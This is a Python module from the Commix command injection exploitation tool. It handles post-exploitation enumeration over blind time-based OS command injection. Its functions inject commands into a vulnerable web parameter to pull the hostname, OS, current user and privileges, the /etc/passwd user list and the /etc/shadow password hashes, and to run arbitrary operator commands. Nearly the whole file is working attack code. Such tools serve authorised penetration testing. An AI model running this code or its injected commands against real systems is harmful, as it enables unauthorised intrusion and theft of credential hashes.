#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2021 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

import re
import sys
from src.thirdparty.six.moves import urllib as _urllib

from src.utils import logs
from src.utils import menu
from src.utils import settings
from src.utils import session_handler

from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.injections.blind.techniques.time_based import tb_injector

"""
The "time-based" injection technique on Blind OS Command Injection.
"""

"""
Powershell's version number enumeration (for Windows OS)
"""
def powershell_version(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response): 
  _ = False
  cmd = settings.PS_VERSION
  if alter_shell:
    cmd = cmd.replace("'","\\'")
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    # The main command injection exploitation.
    check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
    session_handler.store_cmd(url, cmd, output, vuln_parameter)
    _ = True
  else:
    output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
  ps_version = output
  try:
    if float(ps_version):
      settings.PS_ENABLED = True
      ps_version = "".join(str(p) for p in output)
      if settings.VERBOSITY_LEVEL == 0 and _:
        print("")
      # Output PowerShell's version number
      info_msg = "The PowerShell's version number is " 
      info_msg += ps_version + Style.RESET_ALL + Style.BRIGHT
      sys.stdout.write(settings.print_bold_info_msg(info_msg) + ".")
      sys.stdout.flush()
      # Add infos to logs file. 
      output_file = open(filename, "a")
      info_msg = "The PowerShell's version number is " + ps_version + ".\n"
      output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
      output_file.close()
  except ValueError:
    warn_msg = "Heuristics have failed to identify the version of Powershell, "
    warn_msg += "which means that some payloads or injection techniques may be failed." 
    print("\n" + settings.print_warning_msg(warn_msg))
    settings.PS_ENABLED = False
    
"""
Hostname enumeration
"""
def hostname(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response):
  _ = False
  cmd = settings.HOSTNAME
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    # The main command injection exploitation.
    check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
    session_handler.store_cmd(url, cmd, output, vuln_parameter)
    _ = True
  else:
    output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
  shell = output 
  if shell:
    if settings.VERBOSITY_LEVEL == 0 and _:
      print("")
    info_msg = "The hostname is " +  str(shell)
    sys.stdout.write(settings.print_bold_info_msg(info_msg) + ".")
    sys.stdout.flush()
    # Add infos to logs file. 
    output_file = open(filename, "a")
    info_msg = "The hostname is " + str(shell) + ".\n"
    output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
    output_file.close()
  else:
    warn_msg = "Heuristics have failed to identify the hostname."
    print(settings.print_warning_msg(warn_msg))

"""
Retrieve system information
"""
def system_information(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response):
  _ = False  
  if settings.TARGET_OS == "win":
    settings.RECOGNISE_OS = settings.WIN_RECOGNISE_OS
  cmd = settings.RECOGNISE_OS        
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    # The main command injection exploitation.
    check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
    session_handler.store_cmd(url, cmd, output, vuln_parameter)
    _ = True
  else:
    output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
  target_os = output
  if settings.VERBOSITY_LEVEL == 0 and _:
    print("")
  if target_os:
    if settings.TARGET_OS != "win":
      cmd = settings.DISTRO_INFO
      if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
        if settings.VERBOSITY_LEVEL == 0 and _:
          sys.stdout.write("")
        check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
        session_handler.store_cmd(url, cmd, output, vuln_parameter)
      else:
        output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
      distro_name = output
      if len(distro_name) != 0:
          target_os = target_os + " (" + distro_name + ")"
    if settings.TARGET_OS == "win":
      cmd = settings.WIN_RECOGNISE_HP
    else:
      cmd = settings.RECOGNISE_HP
    if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
      if settings.VERBOSITY_LEVEL == 0 and _:
        sys.stdout.write("\n")
      # The main command injection exploitation.
      check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
      session_handler.store_cmd(url, cmd, output, vuln_parameter)
    else:
      output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
    target_arch = output
    if target_arch:
      if settings.VERBOSITY_LEVEL == 0 and _:
        print("")
      info_msg = "The target operating system is " +  str(target_os) + Style.RESET_ALL  
      info_msg += Style.BRIGHT + " and the hardware platform is " +  str(target_arch)
      sys.stdout.write(settings.print_bold_info_msg(info_msg) + ".")
      sys.stdout.flush()
      # Add infos to logs file.   
      output_file = open(filename, "a")
      info_msg = "The target operating system is " + str(target_os)
      info_msg += " and the hardware platform is " + str(target_arch) + ".\n"
      output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
      output_file.close()
  else:
    warn_msg = "Heuristics have failed to retrieve the system information."
    print(settings.print_warning_msg(warn_msg))

"""
The current user enumeration
"""
def current_user(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response):
  _ = False
  if settings.TARGET_OS == "win":
    settings.CURRENT_USER = settings.WIN_CURRENT_USER
  cmd = settings.CURRENT_USER
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    # The main command injection exploitation.
    check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
    session_handler.store_cmd(url, cmd, output, vuln_parameter)
    _ = True
  else:
    output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
  cu_account = output 
  if cu_account:
    # Check if the user have super privileges.
    if menu.options.is_root or menu.options.is_admin:
      if settings.TARGET_OS == "win":
        cmd = settings.IS_ADMIN
      else:  
        cmd = settings.IS_ROOT 
      if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
        if settings.VERBOSITY_LEVEL == 0 and _:
          sys.stdout.write("\n")
        # The main command injection exploitation.
        check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
        session_handler.store_cmd(url, cmd, output, vuln_parameter)
      else:
        output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
      shell = output 
      if settings.VERBOSITY_LEVEL == 0 and _:
        print("")
      info_msg = "The current user is " +  str(cu_account)  
      sys.stdout.write(settings.print_bold_info_msg(info_msg))
      # Add infos to logs file.    
      output_file = open(filename, "a")
      info_msg = "The current user is " + str(cu_account)
      output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
      output_file.close()
      if shell:
        shell = "".join(str(p) for p in shell)
        if (settings.TARGET_OS == "win" and not "Admin" in shell) or \
           (settings.TARGET_OS != "win" and shell != "0"):
          sys.stdout.write(Style.BRIGHT + " and it is " +  "not" + Style.RESET_ALL + Style.BRIGHT + " privileged" + Style.RESET_ALL + ".")
          sys.stdout.flush()
          # Add infos to logs file.   
          output_file = open(filename, "a")
          output_file.write(" and it is not privileged.\n")
          output_file.close()
        else:
          sys.stdout.write(Style.BRIGHT + " and it is " +  Style.RESET_ALL + Style.BRIGHT + "privileged" + Style.RESET_ALL + ".")
          sys.stdout.flush()
          # Add infos to logs file.   
          output_file = open(filename, "a")
          output_file.write(" and it is privileged.\n")
          output_file.close()
    else:
      if settings.VERBOSITY_LEVEL == 0 and _:
        print("")
      info_msg = "The current user is " +  str(cu_account)
      sys.stdout.write(settings.print_bold_info_msg(info_msg) + ".")
      sys.stdout.flush()
      # Add infos to logs file.   
      output_file = open(filename, "a")
      info_msg = "The current user is " + str(cu_account) + "\n"
      output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
      output_file.close()
  else:
    warn_msg = "Heuristics have failed to identify the current user."
    print(settings.print_warning_msg(warn_msg))
    
"""
System users enumeration
"""
def system_users(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response):
  _ = False
  if settings.TARGET_OS == "win":
    settings.SYS_USERS = settings.WIN_SYS_USERS
    settings.SYS_USERS = settings.SYS_USERS + "-replace('\s+',' '))"
    if alter_shell:
      settings.SYS_USERS = settings.SYS_USERS.replace("'","\\'")
  cmd = settings.SYS_USERS  
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    try:
      check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
      session_handler.store_cmd(url, cmd, output, vuln_parameter)
      _ = True
    except TypeError:
      output = ""
  else:
    output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
  sys_users = output 
  # Windows users enumeration.
  if settings.TARGET_OS == "win":
    if settings.VERBOSITY_LEVEL == 0 and _:
      print("")
    info_msg = "Executing the 'net users' command "
    info_msg += "to enumerate users entries. "  
    sys.stdout.write(settings.print_info_msg(info_msg))
    sys.stdout.flush()
    try:
      if sys_users[0] :
        sys_users = "".join(str(p) for p in sys_users).strip()
        sys.stdout.write(settings.SUCCESS_STATUS)
        sys_users_list = re.findall(r"(.*)", sys_users)
        sys_users_list = "".join(str(p) for p in sys_users_list).strip()
        sys_users_list = ' '.join(sys_users_list.split())
        sys_users_list = sys_users_list.split()
        info_msg =  "Identified " + str(len(sys_users_list))
        info_msg += " entr" + ('ies', 'y')[len(sys_users_list) == 1] 
        info_msg += " via 'net users' command.\n"
        sys.stdout.write("\n" + settings.print_bold_info_msg(info_msg))
        sys.stdout.flush()
        # Add infos to logs file.   
        output_file = open(filename, "a")
        output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
        output_file.close()
        count = 0
        for user in range(0, len(sys_users_list)):
          count = count + 1
          if menu.options.privileges:
            info_msg = "Confirming privileges of user '" 
            info_msg += sys_users_list[user] + "'. "
            print(settings.print_info_msg(info_msg))
            cmd = "powershell.exe -InputFormat none write-host (([string]$(net user " + sys_users_list[user] + ")[22..($(net user " + sys_users_list[user] + ").length-3)]).replace('Local Group Memberships','').replace('*','').Trim()).replace(' ','').substring(0,6)"
            if alter_shell:
              cmd = cmd.replace("'","\\'")
            check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
            check_privs = output 
            check_privs = "".join(str(p) for p in check_privs).strip()
            check_privs = re.findall(r"(.*)", check_privs)
            check_privs = "".join(str(p) for p in check_privs).strip()
            check_privs = check_privs.split()
            if "Admin" in check_privs[0]:
              is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " admin user"
              is_privileged_nh = " is admin user "
            else:
              is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " regular user"
              is_privileged_nh = " is regular user "
          else :
            is_privileged = ""
            is_privileged_nh = ""
          if settings.VERBOSITY_LEVEL != 0 and menu.options.ignore_session:
            print("")
          print("\n  [" +str(count)+ "] '" + Style.BRIGHT +  sys_users_list[user] + Style.RESET_ALL + "'" + Style.BRIGHT + is_privileged + Style.RESET_ALL + ".") 
          # Add infos to logs file.   
          output_file = open(filename, "a")
          output_file.write("      [" +str(count)+ "] " + sys_users_list[user] + is_privileged + ".\n" )
          output_file.close()
      else:
        sys.stdout.write(settings.FAIL_STATUS)
        sys.stdout.flush()
        warn_msg = "It seems that you don't have permissions to enumerate users entries."
        print("\n" + settings.print_warning_msg(warn_msg))  
    except TypeError:
      sys.stdout.write(settings.FAIL_STATUS + "\n")
      sys.stdout.flush()
      pass
    except IndexError:
      sys.stdout.write(settings.FAIL_STATUS)
      warn_msg = "It seems that you don't have permissions to enumerate users entries."
      sys.stdout.write("\n" + settings.print_warning_msg(warn_msg))
      sys.stdout.flush()
      pass
  # Unix-like users enumeration.    
  else:
    if settings.VERBOSITY_LEVEL == 0 and _:
      print("")
    info_msg = "Fetching '" + settings.PASSWD_FILE 
    info_msg += "' to enumerate users entries. "
    sys.stdout.write(settings.print_info_msg(info_msg))
    sys.stdout.flush()
    try:
      if sys_users[0] :
        sys_users = "".join(str(p) for p in sys_users).strip()
        if len(sys_users.split(" ")) <= 1 :
          sys_users = sys_users.split("\n")
        else:
          sys_users = sys_users.split(" ")
        # Check for appropriate '/etc/passwd' format.
        if len(sys_users) % 3 != 0 :
          sys.stdout.write(settings.FAIL_STATUS)
          sys.stdout.flush()
          warn_msg = "It seems that '" + settings.PASSWD_FILE + "' file is "
          warn_msg += "not in the appropriate format. Thus, it is expoted as a text file."
          print("\n" + settings.print_warning_msg(warn_msg))
          sys_users = " ".join(str(p) for p in sys_users).strip()
          print(sys_users)
          output_file = open(filename, "a")
          output_file.write("      " + sys_users)
          output_file.close()
        else:  
          sys_users_list = []
          for user in range(0, len(sys_users), 3):
             sys_users_list.append(sys_users[user : user + 3])
          if len(sys_users_list) != 0 :
            sys.stdout.write(settings.SUCCESS_STATUS)
            info_msg = "Identified " + str(len(sys_users_list)) 
            info_msg += " entr" + ('ies', 'y')[len(sys_users_list) == 1] 
            info_msg += " in '" +  settings.PASSWD_FILE + "'."
            sys.stdout.write("\n" + settings.print_bold_info_msg(info_msg))
            sys.stdout.flush()
            # Add infos to logs file.   
            output_file = open(filename, "a")
            output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
            output_file.close()
            count = 0
            for user in range(0, len(sys_users_list)):
              sys_users = sys_users_list[user]
              sys_users = ":".join(str(p) for p in sys_users)
              count = count + 1
              fields = sys_users.split(":")
              fields1 = "".join(str(p) for p in fields)
              # System users privileges enumeration
              try:
                if not fields[2].startswith("/"):
                  raise ValueError()
                if menu.options.privileges:
                  if int(fields[1]) == 0:
                    is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " root user "
                    is_privileged_nh = " is root user "
                  elif int(fields[1]) > 0 and int(fields[1]) < 99 :
                    is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " system user "
                    is_privileged_nh = " is system user "
                  elif int(fields[1]) >= 99 and int(fields[1]) < 65534 :
                    if int(fields[1]) == 99 or int(fields[1]) == 60001 or int(fields[1]) == 65534:
                      is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " anonymous user "
                      is_privileged_nh = " is anonymous user "
                    elif int(fields[1]) == 60002:
                      is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " non-trusted user "
                      is_privileged_nh = " is non-trusted user "   
                    else:
                      is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " regular user "
                      is_privileged_nh = " is regular user "
                  else :
                    is_privileged = ""
                    is_privileged_nh = ""
                else :
                  is_privileged = ""
                  is_privileged_nh = ""
                sys.stdout.write("\n    (" +str(count)+ ") '" + Style.BRIGHT +  fields[0] + Style.RESET_ALL + "'" + Style.BRIGHT + is_privileged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'.")
                sys.stdout.flush()
                # Add infos to logs file.   
                output_file = open(filename, "a")
                output_file.write("    (" +str(count)+ ") '" + fields[0]+ "'" + is_privileged_nh + "(uid=" + fields[1] + "). Home directory is in '" + fields[2] + "'.\n" )
                output_file.close()
              except ValueError:
                if count == 1 :
                  warn_msg = "It seems that '" + settings.PASSWD_FILE + "' file is not in the "
                  warn_msg += "appropriate format. Thus, it is expoted as a text file." 
                  print(settings.print_warning_msg(warn_msg))
                sys_users = " ".join(str(p) for p in sys_users.split(":"))
                print(sys_users) 
                output_file = open(filename, "a")
                output_file.write("      " + sys_users)
                output_file.close()
      else:
        sys.stdout.write(settings.FAIL_STATUS)
        warn_msg = "It seems that you don't have permissions to read '" 
        warn_msg += settings.PASSWD_FILE + "' to enumerate users entries." 
        sys.stdout.write("\n" + settings.print_warning_msg(warn_msg))
        sys.stdout.flush()
    except TypeError:
      sys.stdout.write(settings.FAIL_STATUS + "\n")
      sys.stdout.flush()
      pass
    except IndexError:
      sys.stdout.write(settings.FAIL_STATUS)
      warn_msg = "Some kind of WAF/IPS/IDS probably blocks the attempt to read '" 
      warn_msg += settings.PASSWD_FILE + "' to enumerate users entries." 
      sys.stdout.write("\n" + settings.print_warning_msg(warn_msg))
      sys.stdout.flush()
      pass

"""
System passwords enumeration
"""
def system_passwords(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response):
  _ = False
  if settings.TARGET_OS == "win":
    # Not yet implemented!
    pass
  else:
    cmd = settings.SYS_PASSES           
    if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
      check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
      _ = True
      if output == False:
        output = ""
      session_handler.store_cmd(url, cmd, output, vuln_parameter)  
    else:
      output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
    sys_passes = output 
    if sys_passes == "":
      sys_passes = " "
    if sys_passes :
      info_msg = "Fetching '" + settings.SHADOW_FILE + "' to enumerate users password hashes. "
      sys.stdout.write(settings.print_info_msg(info_msg))
      sys.stdout.flush()
      sys_passes = "".join(str(p) for p in sys_passes)
      sys_passes = sys_passes.replace(" ", "\n")
      sys_passes = sys_passes.split( )
      if len(sys_passes) != 0 :
        sys.stdout.write(settings.SUCCESS_STATUS)
        info_msg = "Identified " + str(len(sys_passes))
        info_msg += " entr" + ('ies', 'y')[len(sys_passes) == 1] 
        info_msg += " in '" +  settings.SHADOW_FILE + "'.\n"
        sys.stdout.write("\n" + settings.print_bold_info_msg(info_msg))
        sys.stdout.flush()
        # Add infos to logs file.   
        output_file = open(filename, "a")
        output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg )
        output_file.close()
        count = 0
        for line in sys_passes:
          count = count + 1
          try:
            if ":" in line:
              fields = line.split(":")
              if not "*" in fields[1] and not "!" in fields[1] and fields[1] != "":
                print("  [" +str(count)+ "] " + Style.BRIGHT + fields[0]+ Style.RESET_ALL + " : " + Style.BRIGHT + fields[1]+ Style.RESET_ALL)
                # Add infos to logs file.   
                output_file = open(filename, "a")
                output_file.write("    (" +str(count)+ ") '" + fields[0] + " : " + fields[1])
                output_file.close()
          # Check for appropriate '/etc/shadow' format.
          except IndexError:
            if count == 1 :
              warn_msg = "It seems that '" + settings.SHADOW_FILE 
              warn_msg += "' file is not in the appropriate format. "
              warn_msg += "Thus, it is expoted as a text file."
              sys.stdout.write(settings.print_warning_msg(warn_msg))
            print(fields[0])
            output_file = open(filename, "a")
            output_file.write("      " + fields[0])
            output_file.close()
      else:
        sys.stdout.write(settings.FAIL_STATUS)
        warn_msg = "It seems that you don't have permissions to read '" 
        warn_msg += settings.SHADOW_FILE + "' to enumerate users password hashes."
        sys.stdout.write("\n" + settings.print_warning_msg(warn_msg))
        sys.stdout.flush()

"""
Single os-shell execution
"""
def single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response):
  cmd = menu.options.os_cmd
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
    session_handler.store_cmd(url, cmd, output, vuln_parameter)
    if settings.VERBOSITY_LEVEL != 0:
      print("") 
    return check_how_long, output
  else:
    output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
    print("\n") + Fore.GREEN + Style.BRIGHT + str(output) + Style.RESET_ALL + "\n"
    logs.print_logs_notification(filename, url) 
    raise SystemExit()

"""
Check the defined options
"""
def do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response):

  if menu.options.ps_version and settings.PS_ENABLED == None:
    if not checks.ps_incompatible_os():
      powershell_version(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
      settings.ENUMERATION_DONE = True

  if menu.options.hostname:
    if settings.ENUMERATION_DONE == True:
      print("")
    hostname(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
    settings.ENUMERATION_DONE = True

  if menu.options.current_user: 
    if settings.ENUMERATION_DONE == True:
      print("")
    current_user(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
    if settings.ENUMERATION_DONE == False:
      settings.ENUMERATION_DONE = True

  if menu.options.sys_info:
    if settings.ENUMERATION_DONE == True:
      print("")
    system_information(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
    if settings.ENUMERATION_DONE == False:
      settings.ENUMERATION_DONE = True

  if menu.options.users:
    if settings.ENUMERATION_DONE == True:
      print("")
    system_users(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
    if settings.ENUMERATION_DONE == False:
      settings.ENUMERATION_DONE = True

  if menu.options.passwords:
    if settings.ENUMERATION_DONE == True:
      print("")
    system_passwords(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
    if settings.ENUMERATION_DONE == False:
      settings.ENUMERATION_DONE = True

# eof